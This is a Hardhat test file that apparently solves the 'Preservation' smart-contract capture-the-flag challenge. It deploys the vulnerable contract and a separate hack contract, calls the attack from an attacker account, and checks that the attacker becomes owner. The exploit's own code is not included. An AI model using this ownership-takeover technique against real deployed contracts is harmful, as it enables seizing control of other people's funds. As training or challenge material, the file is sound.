// Goal
// Claim ownership of the contract.

import { ContractFactory, Signer } from "ethers"
import { LibraryContract, Preservation, PreservationHack } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Preservation', function () {
  let Preservation: ContractFactory
  let preservation: Preservation

  let LibraryContract: ContractFactory
  let libraryContract: LibraryContract

  let PreservationHack: ContractFactory
  let preservationHack: PreservationHack

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    LibraryContract = await ethers.getContractFactory('LibraryContract')
    libraryContract = (await LibraryContract.deploy()) as LibraryContract

    Preservation = await ethers.getContractFactory('Preservation')
    preservation = (await Preservation.deploy(libraryContract.address, libraryContract.address)) as Preservation

    PreservationHack = await ethers.getContractFactory('PreservationHack')
    preservationHack = (await PreservationHack.deploy()) as PreservationHack

    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]
  })

  it('Should claim ownership of the contract', async function () {
    await preservationHack.connect(attacker).attack(preservation.address)
    const owner = await preservation.owner()
    expect(owner).to.equal(await attacker.getAddress())
  })
})